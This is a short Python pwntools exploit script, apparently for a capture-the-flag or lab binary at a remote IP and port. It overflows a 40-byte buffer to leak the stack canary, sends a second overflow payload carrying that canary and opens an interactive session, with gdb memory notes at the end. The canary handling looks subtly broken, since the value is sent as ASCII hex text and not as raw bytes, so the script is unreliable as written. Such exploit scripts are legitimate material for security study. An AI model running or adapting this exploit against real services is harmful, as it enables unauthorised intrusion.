#!/usr/bin/env python3
import pwn
import time

# p = pwn.process('./hello')
p = pwn.remote('140.113.24.241', 30174)

p.recv()
p.sendline(b'1')

p.recv()
payload = 'a'.encode() * 40  + chr(0x0a).encode()
p.send(payload)

canary = "00"
ret = p.recv()
for i in range(58, 65):
    canary = canary + str(f'0x{ret[i]:02x}')[-2:]
canary = "0x" + canary
print(canary)

# print(ret)

p.sendline(b'')
p.send(b'a' * 40 + canary.encode())

p.interactive() 


# --------------------
# x/32wx 0x7fffffffeae0
# 0x7fffffffeb08 ◂— 0x85a60cb838ce6f00